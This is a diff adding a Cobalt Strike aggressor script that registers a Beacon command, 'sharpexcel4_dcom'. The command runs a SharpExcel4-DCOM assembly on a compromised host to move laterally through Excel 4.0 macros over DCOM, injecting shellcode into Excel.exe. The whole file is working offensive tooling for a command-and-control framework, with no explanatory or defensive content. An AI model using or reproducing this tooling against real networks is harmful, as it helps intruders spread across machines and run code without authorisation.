@@ -1,0 +1,19 @@
+beacon_command_register("sharpexcel4_dcom", "Lateral movement using Excel 4.0 / XLM macros via DCOM (direct shellcode injection in Excel.exe)",
+	"Usage: sharpexcel4_dcom [arguments]\n\n" .
+	"Uses execute-assembly to run the assembly and takes given arguments\n");
+alias sharpexcel4_dcom{
+	local('$bid $asm $desc @args $argu');
+	$bid = $1;
+	$asm = "/opt/cobalt_strike_extension_kit/exe/SharpExcel4-DCOM.exe";
+	$desc = "SharpExcel4-DCOM";
+	@args = @_;
+	remove(@args, $bid);
+	$argu = join(' ', @args);
+	if ($argu eq ""){
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
+	}
+	else{
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
+	}
+	bexecute_assembly!($bid, $asm, $argu);
+}
